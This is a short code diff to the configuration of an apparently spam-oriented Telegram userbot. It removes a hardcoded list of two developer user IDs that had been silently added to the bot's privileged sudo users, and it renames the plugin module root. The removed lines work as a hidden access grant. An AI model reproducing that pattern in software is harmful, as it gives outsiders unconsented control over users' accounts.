@@ -35,9 +35,7 @@ sudo = os.getenv("SUDO_USERS")
 SUDO_USERS = []
 if sudo:
     SUDO_USERS = make_int(sudo)
-DEVS = [2068551800, 5174965229]
-for x in DEVS:
-    SUDO_USERS.append(x)
+
 
 
 
@@ -45,7 +43,7 @@ for x in DEVS:
 # SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817").split())))
 #----------------------------------------------
 
-app = Client(name="SESSION", api_id = API_ID, api_hash = API_HASH, session_string=SESSION, plugins=dict(root="Spam.module"))
+app = Client(name="SESSION", api_id = API_ID, api_hash = API_HASH, session_string=SESSION, plugins=dict(root="Meow.Modules"))
 print("Client 1 Found")
 
 
